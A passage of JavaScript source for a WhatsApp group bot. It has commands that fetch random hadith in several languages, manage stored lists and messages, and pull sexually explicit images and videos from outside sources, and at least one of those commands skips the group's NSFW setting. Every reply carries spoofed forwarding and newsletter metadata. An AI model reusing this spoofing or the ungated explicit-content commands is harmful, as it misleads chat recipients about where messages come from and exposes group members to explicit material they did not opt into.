    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-jami-at-tirmidhi?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let hadithText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        // Prepare message with text styling
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: captionText // Styled text
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `_${botname}_` // Italics styling for botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false,
                            ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"🌿","id":"${prefix}quickreply"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '100000000000000000@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
      } else {
        await VeranBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await VeranBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await VeranBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;


case 'sunanannasai': {
  // Languages supported
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'tr': 'Turkish'
  };

  // Initialize language if not provided
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageButtons = Object.keys(languageNames).map(lang => ({
      title: languageNames[lang],
      description: `Select ${languageNames[lang]} language`,
      id: `${prefix}sunanannasai ${lang}`
    }));

    let button = [{
      name: 'single_select',
      buttonParamsJson: {
        title: 'Select Language for Hadith:',
        sections: [{
          title: '*Available Languages*',
          rows: languageButtons
        }]
      }
    }];

    await VeranBotInc.sendButtonMsg(m.chat, '*Choose a language to fetch Hadith:*', null, '*Please select:*', null, button, m);
    return;
  }

  // Extract language from text
  const lang = text.toLowerCase();

  // Generate a random Hadith number between 1 and 324
  const randomHadithNumber = Math.floor(Math.random() * 324) + 1;

  try {
    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-sunan-nasai?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let hadithText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        // Prepare message with text styling
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: captionText // Styled text
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `_${botname}_` // Italics styling for botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false,
                            ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"🌿","id":"${prefix}quickreply"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '100000000000000000@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
      } else {
        await VeranBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await VeranBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await VeranBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;

case 'sunanibnmajah': {
  // Languages supported
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'tr': 'Turkish'
  };

  // Initialize language if not provided
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageButtons = Object.keys(languageNames).map(lang => ({
      title: languageNames[lang],
      description: `Select ${languageNames[lang]} language`,
      id: `${prefix}sunanibnmajah ${lang}`
    }));

    let button = [{
      name: 'single_select',
      buttonParamsJson: {
        title: 'Select Language for Hadith:',
        sections: [{
          title: '*Available Languages*',
          rows: languageButtons
        }]
      }
    }];

    await VeranBotInc.sendButtonMsg(m.chat, '*Choose a language to fetch Hadith:*', null, '*Please select:*', null, button, m);
    return;
  }

  // Extract language from text
  const lang = text.toLowerCase();

  // Generate a random Hadith number between 1 and 266
  const randomHadithNumber = Math.floor(Math.random() * 266) + 1;

  try {
    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-ibn-majah?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let hadithText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        // Prepare message with text styling
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: captionText // Styled text
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `_${botname}_` // Italics styling for botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false,
                            ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"🌿","id":"${prefix}quickreply"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '100000000000000000@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
      } else {
        await VeranBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await VeranBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await VeranBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;


case 'sunanabudawud': {
  // Languages supported
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'rus': 'Russian',
    'tr': 'Turkish'
  };

  // Initialize language if not provided
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageButtons = Object.keys(languageNames).map(lang => ({
      title: languageNames[lang],
      description: `Select ${languageNames[lang]} language`,
      id: `${prefix}sunanabudawud ${lang}`
    }));

    let button = [{
      name: 'single_select',
      buttonParamsJson: {
        title: 'Select Language for Hadith:',
        sections: [{
          title: '*Available Languages*',
          rows: languageButtons
        }]
      }
    }];

    await VeranBotInc.sendButtonMsg(m.chat, '*Choose a language to fetch Hadith:*', null, '*Please select:*', null, button, m);
    return;
  }

  // Extract language from text
  const lang = text.toLowerCase();

  // Generate a random Hadith number between 1 and 390
  const randomHadithNumber = Math.floor(Math.random() * 390) + 1;

  try {
    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-abu-dawud?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let hadithText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*<\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        // Prepare message with text styling
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: captionText // Styled text
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `_${botname}_` // Italics styling for botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false,
                            ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"🌿","id":"${prefix}quickreply"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '100000000000000000@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
      } else {
        await VeranBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await VeranBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await VeranBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;



 //------------------------------------------------------------------------------------------//

  case 'addlist':
if (!VeranTheCreator) return VeranStickOwner()
if (!m.isGroup) return VeranStickGroup()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygcveran(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return replygcveran(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(m.chat, args1, args2, true, `${mem}`, db_respon_list)
replygcveran(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
replygcveran(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!VeranTheCreator) return VeranStickOwner()
if (!m.isGroup) return VeranStickGroup()
if (db_respon_list.length === 0) return replygcveran(`There is no message list in the database yet`)
if (!q) return replygcveran(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(m.chat, q, db_respon_list)) return replygcveran(`Item list by Name *${q}* not in the database!`)
delResponList(m.chat, q, db_respon_list)
replygcveran(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
replygcveran(teks)
}
break
			case 'setprefix':
                if (!VeranTheCreator) return VeranStickOwner()
                if (!text) return replygcveran(`Example : ${prefix + command} #`)
                global.xprefix = text
                replygcveran(`Prefix successfully changed to ${text}`)
                break
			case 'addmsg': {
	if (!VeranTheCreator) return VeranStickOwner()
                if (!m.quoted) return replygcveran('Reply Message You Want To Save In Database')
                if (!text) return replygcveran(`Example : ${prefix + command} filename`)
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) return replygcveran(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcveran(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return replygcveran(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) return replygcveran(`'${text}' not listed in the message list`)
                VeranBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcveran(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!VeranTheCreator) return VeranStickOwner()
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replygcveran(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcveran(`Successfully deleted '${text}' from the message list`)
            }
	    break
			case 'setcmd': {
                if (!m.quoted) return replygcveran('Reply Message!')
                if (!m.quoted.fileSha256) return replygcveran('SHA256 Hash Missing')
                if (!text) return replygcveran(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcveran('You have no permission to change this sticker command')
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcveran(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcveran(`No hashes`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcveran('You have no permission to delete this sticker command')             
                delete global.db.sticker[hash]
                replygcveran(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                VeranBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!VeranTheCreator) return VeranStickOwner()
                if (!m.quoted) return replygcveran('Reply Message!')
                if (!m.quoted.fileSha256) return replygcveran('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return replygcveran('Hash not found in database')
                global.db.sticker[hash].locked = !/^un/i.test(command)
                replygcveran('Done!')
            }
            break
			case 'hentaivid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return VeranStickGroup()
if (!AntiNsfw) return replygcveran(mess.nsfw)
                await VeranStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: result912.video_1 } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
case 'trap' :{
if (!m.isGroup) return VeranStickGroup()
if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-neko' :
case 'hneko' :{
if (!m.isGroup) return VeranStickGroup()
if (!AntiNsfw) return replygcveran(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-waifu' :
case 'nwaifu' :{
if (!m.isGroup) return VeranStickGroup()
if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'gasm':{
if (!m.isGroup) return VeranStickGroup()
	if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break  
case 'milf':{
if (!m.isGroup) return VeranStickGroup()
await VeranStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var veranyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:veranyresult.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break 
case 'animespank':{
if (!m.isGroup) return VeranStickGroup()
if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'blowjob':{
if (!m.isGroup) return VeranStickGroup()
	if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var veranyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:veranyresult.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'cuckold':{
if (!m.isGroup) return VeranStickGroup()
